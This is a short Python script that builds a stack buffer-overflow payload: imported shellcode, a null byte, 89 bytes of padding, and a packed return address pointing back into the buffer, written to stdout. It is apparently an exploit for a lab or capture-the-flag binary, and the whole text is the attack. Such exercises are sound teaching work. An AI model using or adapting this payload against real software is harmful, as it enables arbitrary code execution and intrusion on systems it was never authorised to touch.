import sys
import struct
from shellcode import shellcode

operate_buffer = 0xfffe719c
sys.stdout.buffer.write(shellcode + b'\x00'+ b'a'*89 + struct.pack('<I',operate_buffer))